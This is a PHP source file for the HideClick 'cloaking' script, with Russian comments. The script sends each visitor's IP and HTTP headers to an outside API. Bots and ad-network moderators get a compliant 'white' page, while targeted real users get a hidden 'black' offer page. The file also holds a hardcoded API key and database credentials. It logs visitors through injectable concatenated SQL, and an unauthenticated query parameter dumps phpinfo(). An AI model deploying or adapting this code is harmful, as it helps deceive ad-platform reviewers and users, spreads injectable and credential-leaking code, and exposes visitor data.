<?php
/*********************************************/
/* (c) by HideClick - bot protection service */
/* By using you agree to the GNU AGPLv3 terms*/
/*********************************************/

/* Отредактируйте обязательные настройки     */
$CLOAKING['WHITE_PAGE'] = 'white.html';//PHP или HTML файл для ботов и модераторов
$CLOAKING['OFFER_PAGE'] = 'black.html';//PHP или HTML файл с оффером/лендингом для пользователей на которых таргетируемся.
$CLOAKING['DEBUG_MODE'] = 'off';// замените "on" на "off" после тестирования настроек хостинга чтобы отключить режим самотестирования.
/*********************************************/
/* Доступные дополнительные настройки        */
/* Режим "паранои": блокирует spy / verification сервисы использующие residential proxy, но при этом в некоторых гео может блокировать реальных пользователей. */
/* удалите символы "//" в начале следующей строки чтобы включить режим "паранои": */
//$CLOAKING['PARANOID'] = 'true';
/* Режим "гео фильтрации": показывает OFFER_PAGE (лендинг) только пользователям из разрешенных стран.  */
/* удалите символы "//" в начале следующей строки и пропишите 2х буквенные коды стран которым можно показывать ленд */
$CLOAKING['ALLOW_GEO'] = 'RU,ID';
/* Следующие настройки нужны только если у вас не стандартный хостинг и что-то не работает */
/* удалите символы "//" в начале следующей строки если при доступе к стате выдает ошибку "Warning: file_get_contents(): https:// wrapper is disabled" */
//$CLOAKING['USE_CURL'] = true;
/* удалите символы "//" в начале следующей строки если клоака не работает и сайт использует CDN, Varnish или другой кеширующий прокси */
//$CLOAKING['DISABLE_CACHE'] = true;
/*********************************************/
/* Ваш API ключ. Храните его в секрете!      */
/* DO NOT SHARE API KEY! KEEP IT SECRET!     */
$CLOAKING['API_SECRET_KEY'] = 'v192eaaa2dd8374c9ebf11029e772e6b3a';// ключ доступа к API.
/*********************************************/
// Не вносите изменения в дальнейший код (по крайней мере если вы не PHP програмист)
// DO NOT EDIT ANYTHING BELOW !!!
$CLOAKING['VERSION']=20191230;
//$CLOAKING['HTACCESS_FIX'] = true;

$errorContactMessage="<br><br>Need help? Contact us by telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a><br>Что-то пошло не так. Если вам нужна помощь свяжитесь с нами в телеграме: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a><br>";

if(empty($CLOAKING['PARANOID'])) $CLOAKING['PARANOID']='';
if(empty($CLOAKING['ALLOW_GEO'])) $CLOAKING['ALLOW_GEO']='';
if(empty($CLOAKING['USE_CURL'])) $CLOAKING['USE_CURL']='';
if(empty($CLOAKING['HTACCESS_FIX'])) $CLOAKING['HTACCESS_FIX']='';
if(empty($CLOAKING['DISABLE_CACHE'])) $CLOAKING['DISABLE_CACHE']='';
else {
    setcookie("euConsent", 'true');
    setcookie("BC_GDPR", time());
    header( "Cache-control: private, max-age=0, no-cache, no-store, must-revalidate, s-maxage=0" );
    header( "Pragma: no-cache" );
    header( "Expires: ".date('D, d M Y H:i:s',rand(1560500925,1571559523))." GMT");
}

if(!empty($_REQUEST['cloaking'])) {
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    if ($_REQUEST['cloaking'] == 'stat' || $_REQUEST['cloaking'] == 'stats') {
        if(empty($CLOAKING['API_SECRET_KEY'])||strlen($CLOAKING['API_SECRET_KEY'])<16) {
            echo '<html><head><meta charset="UTF-8"></head><body><b>Ошибка: не указан секретный API ключ!</b><br>Пропишите ваш ключ (вы сможете найти его в почте, или предыдущей версии скрипта) в строке <b>#'.cloakedEditor("\$CLOAKING['API_SECRET_KEY']").'</b> чтобы получилось:<br><code>$CLOAKING[\'API_SECRET_KEY\'] = \'ТУТ ВАШ КЛЮЧ\';</code><br>'.$errorContactMessage;
            die();
        }

        if(!empty($_SERVER['HTTP_HOST'])) $host=$_SERVER['HTTP_HOST'];
        else if(!empty($_SERVER['Host'])) $host=$_SERVER['Host'];
        else if(!empty($_SERVER['host'])) $host=$_SERVER['host'];
        else if(!empty($_SERVER[':authority'])) $host=$_SERVER[':authority'];
        else $host='';
        if(!empty($_SERVER['REQUEST_URI'])) $host.=$_SERVER['REQUEST_URI'];
        if(stristr($host,'?')) $host=substr(0,strpos($host,'?'));
        if(substr($host,0,4)=='www.') $host=substr($host,4);

        if (empty($CLOAKING['USE_CURL'])) $statistic = file_get_contents('https://cloaking.link/stat?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&version='.$CLOAKING['VERSION'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&host=' . urlencode($host) . '&white=' . urlencode($CLOAKING['WHITE_PAGE']) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']), 'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 45), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,) )) );
        else $statistic = cloakedCurl('https://cloaking.link/stat?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&version='.$CLOAKING['VERSION'].'&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&host=' . urlencode($host) . '&white=' . urlencode($CLOAKING['WHITE_PAGE']) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']));
        echo $statistic;
        if (empty($statistic)) echo "<html><head><meta charset=\"UTF-8\"></head><body>".$errorContactMessage;
    }
    else if ($_REQUEST['cloaking'] == 'white') cloakedWhitePage($CLOAKING['WHITE_PAGE']);
    else if ($_REQUEST['cloaking'] == 'offer') cloakedOfferPage($CLOAKING['OFFER_PAGE']);
    else if ($_REQUEST['cloaking'] == 'debug') {phpinfo();die();}
    else if ($_REQUEST['cloaking'] == 'time') {
        header( "Cache-control: public, max-age=999999, s-maxage=999999" );
        header( "Expires: Wed, 21 Oct 2025 07:28:00 GMT" );
        echo str_replace(" ","",rand(1,10000).microtime().rand(1,100000));
    }
    die();
}
// так как большинство пользователей косячит, пришлось ввести режим настройки...
// если у вас в команде нормальный админ и програмист, это можно удалить
else if($CLOAKING['DEBUG_MODE'] == 'on'){
    set_time_limit(5);
    ini_set('max_execution_time',5);
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    $error=0;
    // не можем использовать $_SERVER["REDIRECT_URL"], так как есть сервера у которых этот параметр используется даже без редиректа.
    if(!empty($_GET) || !empty($_POST) || ($_SERVER["SCRIPT_NAME"]!=$_SERVER["REQUEST_URI"] && $_SERVER["REQUEST_URI"]!=str_replace("index.php","",$_SERVER["SCRIPT_NAME"]))) {
        echo "<html><head><meta charset=\"UTF-8\"></head><body>Error with rewrite engine.<!--//'".$_SERVER["SCRIPT_NAME"]."'!='".$_SERVER["REQUEST_URI"]."'//-->".$errorContactMessage;
        die();
    }
    echo '<html><head><meta charset="UTF-8"><style type="text/css">body, html {font-family: Calibri, Ebrima;}img {margin-left:2em;opacity: 0.25;}img:hover {opacity: 1.0;}</style></head><body><b>Поздравляем.</b><br>Вы стали на один шаг ближе к новому уровню работы с рекламными сетями.<br><br><b>Давайте убедимся, что всё настроено правильно:</b><br>';
    if(is_file($CLOAKING['WHITE_PAGE'])) echo '✔ WHITE_PAGE - ок. <a target="_blank" href="?cloaking=white">Нажмите чтобы открыть WHITE_PAGE</a>. Убедитесь что страница отображается правильно.<br>';
    else if(strstr($CLOAKING['WHITE_PAGE'],'://')) echo '✔ WHITE_PAGE - ок. Настоятельно рекомендуем хранить WHITE_PAGE у себя на сайте! <a target="_blank" href="?cloaking=white">Нажмите чтобы открыть WHITE_PAGE</a>. Убедитесь что страница отображается правильно.<br>';
    else {echo '❌ WHITE_PAGE - ошибка! Измените значение в строке <b>#'.cloakedEditor("\$CLOAKING['WHITE_PAGE']").'</b> на страницу которая будет показываться ботам<br><img src="http://hide.click/gif/white.gif" border="1"><br>';$error=1;}

    if(is_file($CLOAKING['OFFER_PAGE']) || strstr($CLOAKING['OFFER_PAGE'],'://')) echo '✔ OFFER_PAGE - ок. <a target="_blank" href="?cloaking=offer">Нажмите чтобы открыть OFFER_PAGE</a>. Убедитесь что страница отображается правильно.<br>';
    else {echo '❌ OFFER_PAGE - ошибка! Измените значение в строке <b>#'.cloakedEditor("\$CLOAKING['OFFER_PAGE']").'</b> на страницу которая будет показываться реальным людям<br><img src="http://hide.click/gif/black.gif" border="1"><br>';$error=1;}
    $CLOAKINGdata=[];
    if(empty($CLOAKING['USE_CURL'])) $CLOAKING['STATUS'] = @file_get_contents('http://api.cloaking.link/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&version='.$CLOAKING['VERSION'].'&curl='.$CLOAKING['USE_CURL'].'&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'] , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
    else $CLOAKING['STATUS'] = @cloakedCurl('http://api.cloaking.link/basic?ip=1.1.1.1&port=1111&key='.$CLOAKING['API_SECRET_KEY'].'&version='.$CLOAKING['VERSION'].'&curl='.$CLOAKING['USE_CURL'].'&cache='.$CLOAKING['DISABLE_CACHE'].'&htaccess='.$CLOAKING['HTACCESS_FIX'], $CLOAKINGdata);

    if(!$CLOAKING['STATUS'] || stristr($CLOAKING['STATUS'],'error')){
        if(empty($CLOAKING['USE_CURL'])) echo '❌ PHP сконфигурирован неправильно. Уберите символы <b>//</b> в начале строки <b>#'.cloakedEditor("\$CLOAKING['USE_CURL']").'</b>. чтобы включить режим "USE_CURL".<br><img src="http://hide.click/gif/curl.gif" border="1"><br>';
        else echo '❌ PHP сконфигурирован неправильно. Обратитесь в поддержку хостинга и попросите их включить поддержку CURL для РНР.<br>';
        $error=1;
    }
    if(stristr($CLOAKING['STATUS'],'payment')||stristr($CLOAKING['STATUS'],'expired')){
        echo '❌ Срок действия вашего секретного API ключа завершился. Обратитесь в саппорт для продления сервиса!<br>';
        $error=1;
    }
    $CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);
    if(empty($CLOAKING['STATUS']) || empty($CLOAKING['STATUS']['action'])){
        echo '❌ PHP сконфигурирован неправильно.  Обратитесь в поддержку.<br>';
        $error=1;
    }

    // надо проверить кеширование на сервере...
    $testUrl= ( $_SERVER["SERVER_PORT"]==443 || (!empty($_SERVER['HTTP_CF_VISITOR']) && stristr($_SERVER['HTTP_CF_VISITOR'],'https') )) ? 'https://' : 'http://';
    // не можем использовать $_SERVER['HTTP_HOST'], так как потом возникают косяки из-за CDN
    $queryBug=strpos($_SERVER["REQUEST_URI"],'?');
    if(empty($_SERVER["SERVER_NAME"]) || $_SERVER["SERVER_NAME"] == '_' || $_SERVER["SERVER_NAME"] == 'localhost') $_SERVER["SERVER_NAME"] = $_SERVER["HTTP_HOST"];
    if($queryBug>0) $testUrl.=$_SERVER["SERVER_NAME"].substr($_SERVER["REQUEST_URI"],0,$queryBug).'?cloaking=time';
    else $testUrl.=$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"].'?cloaking=time';
    $http_response_header=[];
    $static1 = empty($CLOAKING['USE_CURL']) ? file_get_contents($testUrl,'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 5), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,))) ) : cloakedCurl($testUrl);
    $static2 = empty($CLOAKING['USE_CURL']) ? file_get_contents($testUrl,'r', stream_context_create(array('http' => array('method' => 'GET', 'timeout' => 5), 'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,))) ) : cloakedCurl($testUrl);
    $static3 = empty($CLOAKING['USE_CURL']) ? implode("\n",$http_response_header) : cloakedCurl($testUrl,'',true);
    // Set-Cookie vs empty($CLOAKING['DISABLE_CACHE']) || !empty($CLOAKING['DISABLE_CACHE']) ???
    if(preg_match('#Proxy|Microcachable#i',$static3) || (empty($CLOAKING['DISABLE_CACHE']) && preg_match('#Proxy|Microcachable|Set-Cookie#i', $static3)) ){
        echo '❌ Плохая конфигурация сервера. Свяжитесь с нами. Мы поможем. Нам не сложно.<br><br>';
    }
    else if($static1>0 && $static2>0 && $static1<=100000  && $static2<=100000 && $static1!=$static2) {}
    else if(empty($static1)||empty($static2)) {
        echo '❌ Нестандартная конфигурация сервера. Свяжитесь с нами. Мы поможем в настройке. Нам не сложно.<br><br>';
        $error=1;
    }
    else if(!empty($CLOAKING['DISABLE_CACHE'])) {
        echo '❌ Сервер сконфигурирован неправильно. Попросите поддержку хостинга выключить кеширование (или смените хостинг провайдера).<br><br>';
        $error=1;
    }
    else {
        echo '❌ Сервер сконфигурирован неправильно. Уберите символы <b>//</b> в начале строки <b>#'.cloakedEditor("\$CLOAKING['DISABLE_CACHE']").'</b> чтобы включить режим "DISABLE_CACHE".<br><img src="http://hide.click/gif/cache.gif" border="1"><br><br>';
        $error=1;
    }
    if(preg_match('#[^A-Za-z ,]+#',$CLOAKING['ALLOW_GEO'])) {
        echo '❌ Гео фильтр настроен неправильно. В строке <b>#'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b> могут быть только буквы A-Z (2х буквенные коды стран) и запятые.<br><img src="http://hide.click/gif/geo.gif" border="1"><br>';
        $error=1;
    }

    if($error) { echo "<br><b>Исправьте ошибки и перезагрузите страницу.</b><br><br>Нужна помощь? Напишите нам в телеграм: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a>";die(); }

    if(empty($CLOAKING['ALLOW_GEO'])) echo '✔ Фильтрация по гео выключена. Вы можете включить её убрав символы <b>//</b> в начале строки <b>#'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b> и изменив значение на 2х буквенные коды нужных стран.<br><img src="http://hide.click/gif/geo.gif" border="1"><br>';
    else echo '✔ Фильтрация по гео включена. Все страны кроме '.$CLOAKING['ALLOW_GEO'].' уйдут на вайтпейдж. Вы можете изменить список стран в строке #'.cloakedEditor("\$CLOAKING['ALLOW_GEO']").'</b><br><img src="http://hide.click/gif/geo.gif" border="1"><br>';
    echo '✔ <a target="_blank" href="?cloaking=stat">Нажмите чтобы открыть страницу статистики</a>. Сохраните её в закладках.<br><br>';
    echo 'Отлично. Вы стали мастером по настройке HideClick.<br>В дальнейшем, на серверах данного хостинга, загружайте отредактированный файл и система будет работать сразу!<br><br>';
    echo '<b><u>Остался последний шаг:</u></b><br>Если всё работает без ошибок, выключите режим настройки (DEBUG_MODE) изменив значение в строке <b>#'.cloakedEditor("\$CLOAKING['DEBUG_MODE']").'</b> на <b>off</b>.<br><img src="http://hide.click/gif/debug.gif" border="1"><br>';
    echo 'После этого скрипт начнёт работать в боевом режиме и вместо этой страницы вы увидите страницу оффера или вайтпейдж.<br><br>';
    echo '<b>Важно!<br>WHITE_PAGE ДОЛЖЕН ПОЛНОСТЬЮ СООТВЕТСТВОВАТЬ ВСЕМ ПРАВИЛАМ РЕКЛАМНОЙ СЕТИ!</b><br>Информацию о том как сделать правильный вайтпейдж можно найти у нас в телеграме: <a href="tg://resolve?domain=hideclick_official">@hideclick_official</a>.';
    die();
}
else {

}

if(empty($CLOAKING['WHITE_PAGE']) || (!strstr($CLOAKING['WHITE_PAGE'],'://') && !is_file($CLOAKING['WHITE_PAGE']))){
    echo "<html><head><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: ".$CLOAKING['WHITE_PAGE']."! \r\n<br><br>Файл не найден:".$CLOAKING['WHITE_PAGE']."!".$errorContactMessage;
    die();
}
if(empty($CLOAKING['OFFER_PAGE']) || (!strstr($CLOAKING['OFFER_PAGE'],'://') && !is_file($CLOAKING['OFFER_PAGE']))){
    echo "<html><head><meta charset=\"UTF-8\"></head><body>ERROR FILE NOT FOUND: ".$CLOAKING['OFFER_PAGE']."! \r\n<br><br>Файл не найден:".$CLOAKING['OFFER_PAGE']."!".$errorContactMessage;
    die();
}
// отсюда начинается реальная логика работы скрипта.
// dirty hack для бинома и подобно настроенных серверов, у которых все запросы идут через скрипт.

if (function_exists('header_remove')) header_remove("X-Powered-By");
@ini_set('expose_php', 'off');

if(empty($CLOAKING['HTACCESS_FIX']) && preg_match('#\.(jpg|gif|jpeg|css|gif|svg|ttf|woff|webm|ico)$#i',$_SERVER["REQUEST_URI"])){
    if(!stristr($CLOAKING['OFFER_PAGE'],'://')) cloakedOfferPage($CLOAKING['OFFER_PAGE']);
    else cloakedWhitePage($CLOAKING['WHITE_PAGE']);
}
$CLOAKINGdata = [];


if (function_exists("getallheaders")) $CLOAKINGdata = getallheaders();
foreach($_SERVER as $k=> $v){
    if (substr($k, 0, 5) == 'HTTP_') $CLOAKINGdata[$k] = $v;
}
$CLOAKINGdata['path']=$_SERVER["REQUEST_URI"];
$CLOAKINGdata = json_encode($CLOAKINGdata);
if(empty($CLOAKING['USE_CURL'])) $CLOAKING['STATUS'] = @file_get_contents('http://api.cloaking.link/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&key='.$CLOAKING['API_SECRET_KEY'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&paranoid='.$CLOAKING['PARANOID'].'&white='.urlencode($CLOAKING['WHITE_PAGE']).'&offer='.urlencode($CLOAKING['OFFER_PAGE']) , 'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,), 'http' => array('method' => 'POST', 'timeout' => 5, 'header'=> "Content-type: application/x-www-form-urlencoded\r\n". "Content-Length: ".strlen($CLOAKINGdata). "\r\n", 'content' => $CLOAKINGdata))));
else $CLOAKING['STATUS'] = @cloakedCurl('http://api.cloaking.link/basic?ip='.$_SERVER["REMOTE_ADDR"].'&port='.$_SERVER["REMOTE_PORT"].'&key='.$CLOAKING['API_SECRET_KEY'].'&geo='.preg_replace('#[^a-zA-Z,]+#',',',$CLOAKING['ALLOW_GEO']).'&paranoid='.$CLOAKING['PARANOID'].'&white='.urlencode($CLOAKING['WHITE_PAGE']).'&offer='.urlencode($CLOAKING['OFFER_PAGE']), $CLOAKINGdata);
$CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);
$time=rand(1560500925,1571559523);

date_default_timezone_set('Europe/Moscow'); // ставим московское время

$log = [];
$log['date'] = date("Y-m-d H:i:s");
$log['ip'] = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$log['allow_geo'] = (isset($CLOAKING['ALLOW_GEO']) ? $CLOAKING['ALLOW_GEO'] : 'null');
$log['curr_geo'] = $CLOAKING['STATUS']['geo'];
$log['account'] = isset($_GET['data1']) ? $_GET['data1'] : (isset($_GET['s']) ? $_GET['s'] : 'github_test1');
$log['ua'] = $_SERVER["HTTP_USER_AGENT"];
$log['action'] = $CLOAKING['STATUS']['action'];
$log['json_cloakingdata'] = $CLOAKINGdata;
$log['json_cloaking'] = json_encode($CLOAKING['STATUS']);
$log['host'] = $_SERVER['HTTP_HOST'];
$log['referer'] = @$_SERVER['HTTP_REFERER'];
//var_dump($log); die;

// Параметры для подключения
$db_host = '149.154.68.7';
$db_user = 'cloak'; // логин бд
$db_password = '4B5g7T5x'; // пароль бд
$db_base = 'cloaking'; // имя бд
$db_table = 'log_cloaking_new'; // имя таблицы бд

//var_dump($CLOAKINGdata, $CLOAKING['STATUS']);

if (!empty($CLOAKING['STATUS']) && !empty($CLOAKING['STATUS']['action']) && $CLOAKING['STATUS']['action'] == 'allow' && (empty($CLOAKING['ALLOW_GEO']) || (!empty($CLOAKING['STATUS']['geo']) && !empty($CLOAKING['ALLOW_GEO']) && stristr($CLOAKING['ALLOW_GEO'],$CLOAKING['STATUS']['geo'])))) {

    $log['hand_action'] = 'black';
    // Подключение к базе данных
    $mysqli = new mysqli($db_host,$db_user,$db_password,$db_base);

    // если есть ошибка соединения, выводим её и убиваем подключение
    if($mysqli->connect_error) {
        $errorDB = 'Ошибка : ('. $mysqli->connect_errno .') '. $mysqli->connect_error;
    }
    else {
        $query = "INSERT INTO ".$db_table." VALUES (
            'null', '".
            $log['date']."', '".
            $log['ip']."', '".
            $log['allow_geo']."', '".
            $log['curr_geo']."', '".
            $log['account']."', '".
            $log['ua']."', '".
            $log['action']."', '".
            $log['hand_action']."', '".
            $log['json_cloakingdata']."', '".
            $log['json_cloaking']."', '".
            $log['host']."', '".
            $log['referer']."')";
        $result = $mysqli->query($query);
        //var_dump($result);

        if($result) {
            //echo "Информация занесена в базу данных";
        } else {
            //echo "Информация не занесена в базу данных";
        }
    }
    //mysqli_close($mysqli);

    //var_dump('BLACK'); die;

    cloakedOfferPage($CLOAKING['OFFER_PAGE']);
}
else {
    $log['hand_action'] = 'white';
    // Подключение к базе данных
    $mysqli = new mysqli($db_host,$db_user,$db_password,$db_base);

    // если есть ошибка соединения, выводим её и убиваем подключение
    if($mysqli->connect_error) {
        $errorDB = 'Ошибка : ('. $mysqli->connect_errno .') '. $mysqli->connect_error;
    }
    else {
        $query = "INSERT INTO ".$db_table." VALUES (
            'null', '".
            $log['date']."', '".
            $log['ip']."', '".
            $log['allow_geo']."', '".
            $log['curr_geo']."', '".
            $log['account']."', '".
            $log['ua']."', '".
            $log['action']."', '".
            $log['hand_action']."', '".
            $log['json_cloakingdata']."', '".
            $log['json_cloaking']."', '".
            $log['host']."', '".
            $log['referer']."')";
        $result = $mysqli->query($query);
        //var_dump($result);

        if($result) {
            //echo "Информация занесена в базу данных";
        } else {
            //echo "Информация не занесена в базу данных";
        }
    }
    //mysqli_close($mysqli);

    //var_dump('WHITE'); die;

    cloakedWhitePage($CLOAKING['WHITE_PAGE']);
}

function cloakedOfferPage($offer){
    //if(substr($offer,0,8)=='https://' || substr($offer,0,7)=='http://') header("Location: ".$offer);
    if(substr($offer,0,8)=='https://' || substr($offer,0,7)=='http://') echo '<html><head><meta http-equiv="Refresh" content="0; URL='.$offer.'" ></head></html>';
    else require_once($offer);// сюда попадают реальные пользователи из нужного гео
    die();
}
function cloakedWhitePage($white){
    // if(substr($white,0,8)=='https://' || substr($white,0,7)=='http://') header("Location: ".$white);
    // if(substr($white,0,8)=='https://' || substr($white,0,7)=='http://') echo '<html><head><meta http-equiv="Refresh" content="0; URL='.$white.'" ></head></html>';
    if(substr($white,0,8)=='https://' || substr($white,0,7)=='http://') {
        if(empty($CLOAKING['USE_CURL'])) $page=file_get_contents($white,'r', stream_context_create(array('ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false,))));
        else $page=cloakedCurl($white);
        $page=preg_replace('#(<head[^>]*>)#imU','$1<base href="'.$white.'">',$page,1);
        $page=preg_replace('#https://connect\.facebook\.net/[a-zA-Z_-]+/fbevents\.js#imU','',$page);
        if(empty($page)) {
            header("HTTP/1.1 503 Service Unavailable", true,503);
        }
        echo $page;
    }
    else require_once($white);// сюда попадают боты и модеры
    die();
}
function cloakedCurl($url,$body='',$returnHeaders=false){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    if(!empty($body)) curl_setopt($ch, CURLOPT_POST, 1);
    if(!empty($returnHeaders)) curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 45);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $r = @curl_exec($ch);
    curl_close ($ch);
    return $r;
}
function cloakedEditor($s){
    $f=file($_SERVER["SCRIPT_FILENAME"]);
    $r=0;
    foreach ($f as $n=>$l){if(strstr($l,$s)) {$r=$n;break;}}
    return $r+1;
}
?>